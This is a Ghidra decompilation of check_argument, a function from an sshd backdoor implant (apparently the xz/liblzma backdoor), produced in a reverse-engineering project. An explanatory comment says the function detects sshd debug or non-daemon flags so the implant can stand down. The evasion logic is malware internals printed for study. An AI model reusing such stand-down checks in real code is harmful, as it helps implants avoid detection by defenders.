// /home/kali/xzre-ghidra/xzregh/1039C0_check_argument.c
// Function: check_argument @ 0x1039C0
// Calling convention: __stdcall
// Prototype: char * __stdcall check_argument(char arg_first_char, char * arg_name)
/*
 * AutoDoc: Scans a dash-prefixed argv string for forbidden switches like '-d'/'-D' or unusual characters and returns a pointer only when a disallowed flag is present. `process_is_sshd` relies on it to detect debug or non-daemon modes so the implant can stand down in those cases.
 */

#include "xzre_types.h"


char * check_argument(char arg_first_char,char *arg_name)

{
  ushort uVar1;
  ushort uVar2;
  ushort uVar3;
  
  if (arg_first_char == '-') {
    while( true ) {
      uVar1 = *(ushort *)arg_name;
      uVar3 = uVar1 << 8;
      uVar2 = uVar1 & 0xff00;
      if ((uVar2 == 0x6400) || (uVar3 == 0x6400)) break;
      if ((((uVar1 & 0xdf00) == 0) ||
          (((uVar2 == 0x900 || (uVar2 == 0x3d00)) || ((uVar3 & 0xdf00) == 0)))) ||
         ((uVar3 == 0x3d00 || (uVar3 == 0x900)))) goto LAB_00103a17;
      arg_name = (char *)((long)arg_name + 2);
    }
  }
  else {
LAB_00103a17:
    arg_name = (char *)0x0;
  }
  return arg_name;
}

